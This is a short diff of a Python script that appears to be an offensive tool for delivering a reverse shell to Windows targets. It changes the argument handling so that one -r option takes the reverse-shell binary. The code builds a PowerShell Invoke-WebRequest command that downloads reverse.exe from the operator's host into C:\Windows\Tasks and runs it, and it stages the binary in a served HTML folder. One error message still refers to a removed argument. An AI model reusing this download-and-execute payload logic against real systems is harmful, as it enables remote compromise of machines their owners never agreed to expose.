@@ -83,12 +83,9 @@ def __main__():
     )
 
     optional.add_argument("-r", "--reverse", action="store", dest="reverse", 
-        help = "Reverse shell port"
-    )
-
-    required.add_argument("-s", "--shell", action="store", dest="file",
         help = "Reverse shell binary"
     )
+
 
     args = parser.parse_args()
 
@@ -103,15 +100,11 @@ def __main__():
 
     if args.reverse:
 
-        if not args.file:
-            raise SystemExit("Please specify a reverse shell binary: -s")
-
         reverse = True
-        reverse_port = args.reverse
         command = f"""Invoke-WebRequest http://{args.host}:{args.port}/reverse.exe -OutFile C:\\Windows\\Tasks\\reverse.exe; C:\\Windows\\Tasks\\reverse.exe"""
 
         try:
-            os.rename(f"./{args.file}", "./src/html/reverse.exe")
+            os.rename(f"./{args.reverse}", "./src/html/reverse.exe")
 
         except:
             raise SystemExit(f"Can't find the following file: {args.file}")
